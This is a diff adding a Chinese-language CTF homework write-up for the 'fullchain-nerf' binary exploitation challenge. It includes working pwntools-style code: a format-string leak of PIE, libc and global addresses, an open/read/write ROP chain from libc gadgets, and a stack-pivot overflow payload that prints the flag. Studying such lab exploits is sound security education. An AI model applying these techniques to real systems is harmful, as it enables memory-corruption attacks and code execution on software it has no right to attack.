@@ -387,6 +387,97 @@ send_cmd2srv("local", "ggg")
 
 ## Homework - fullchain-nerf
 
-這題算是上ㄧ題的弱化版，沒有抹掉 `__libc_start_main`、沒有 Canary、有個用 `read` 寫 `0x60` 長度的 Buffer Overflow、全部 Function 都是正常 Return，再加上那個赤裸裸的 format string vuln 可以讀寫任意地方，ROP Chain 是個可行的選項。
+這題算是上ㄧ題的弱化版，沒有抹掉 `__libc_start_main`、沒有 Canary、cnt 在 `local` 下面、有個用 `read` 寫 `0x60` 長度的 Buffer Overflow、全部 Function 都是正常 Return，再加上那個赤裸裸的 format string vuln 可以讀寫任意地方，ROP Chain 是個可行的選項。另一個使用 ROP Chain 的原因，是因為這題沒有像 fullchain 中的 `myset` 可以拿來變成 `mprotect` 的 trigger，所以剩下可以執行任意程式碼的選項就剩 ROP 了。
 
+### Pwn
 
+解題步驟如下：
+
+1. 透過每次 Overflow 的時候順便複寫 `cnt` 的數值
+2. 透過 Format String Vuln 得到所需要的記憶體位置
+3. 建構出 `open`, `read`, `write` 的 ROP Chain
+4. Stack pivoting 到 RopChain 的位置，觸發執行
+
+#### 取得記憶體位置
+
+總共需要三個記憶體位置，`PIE_BASE`、`LIBC_BASE`、`GLOBAL_VAR_ADDR`，因為 Stack 中的數值的相對位置並不會因為每次執行而不同，所以可以透過以下的 payload 一次 leak 出來：
+
+```python
+payload = b"%17$lx|%19$lx|%7$lx\n"
+
+send_cmd2srv("global", "read", payload)
+send_cmd2srv("global", "write")
+
+tmp = r.recvline().split(b"|")
+
+PIE_BASE = int(tmp[0].decode(), 16) - 100 - 0x15fd
+LIBC_BASE = int(tmp[1].decode(), 16) - 243 - 0x26fc0
+GLOBAL_VAR_ADDR = int(tmp[2].decode(), 16)
+```
+
+#### 創建 ROP Chain
+
+這裡就比較一般了，透過 `ROPgadget` 從 libc 中搜出需要的 Gadgets 後串成 `open`, `read`, `write`：
+
+```python
+# ROP Gadgets
+POP_RDX_RBX = LIBC_BASE + 0x162866
+POP_RDI = LIBC_BASE + 0x26b72
+POP_RAX = LIBC_BASE + 0x4a550
+POP_RSI = LIBC_BASE + 0x27529
+SYSCALL_RET = LIBC_BASE + 0x66229
+STACK_PIVOT_RET = LIBC_BASE + 0x5aa48
+FINAL_STACK_PIVOT = GLOBAL_VAR_POS + 0x50
+
+rops = [
+    FINAL_STACK_PIVOT,
+    # OPEN
+    POP_RAX, 2,
+    POP_RDI, GLOBAL_VAR_POS,
+    POP_RSI, 0,
+    POP_RDX_RBX, 0, 0,
+    SYSCALL_RET,
+
+    # READ
+    POP_RAX, 0,
+    POP_RDI, 3,
+    POP_RSI, GLOBAL_VAR_POS,
+    POP_RDX_RBX, FLAG_LENGTH, 0,
+    SYSCALL_RET,
+
+    # Write
+    POP_RAX, 1,
+    POP_RDI, 1,
+    POP_RSI, GLOBAL_VAR_POS,
+    POP_RDX_RBX, FLAG_LENGTH, 0,
+    SYSCALL_RET
+]
+```
+
+接著透過 Format String 的 Vuln 就可以一路順順的從 `global + 0x50` 的位置開始往下寫，當作接下來的 Stack 使用：
+
+```python
+for i in range(len(rops)):
+    format_str_write_addr(FINAL_STACK_PIVOT + i * 8, rops[i])
+```
+
+#### Stack Pivoting and Invoking the Chain
+
+因為這題的 Overflow 太好操控了，所以以下這個 Payload 就可以一次把需要的 Gadgets 寫到 Return 的位置後執行：
+
+```python
+payload = flat(
+    0, 0, 0, 0)
+payload += p32(0) + p32(0x1)  # cnt set to 1
+payload += flat(
+    0,
+    FINAL_STACK_PIVOT,
+    STACK_PIVOT_RET
+)
+send_cmd2srv("local", "read", payload)
+send_cmd2srv("global", "read", (FLAG_PATH+"\0").encode())
+```
+
+#### 執行結果
+
+我的解題順序其實是先寫 `fullchain-nerf` 才去解 `fullchain`，所以才會跟 fullchain 那邊的解法有滿多差異，Code 也比較沒有邏輯 XD
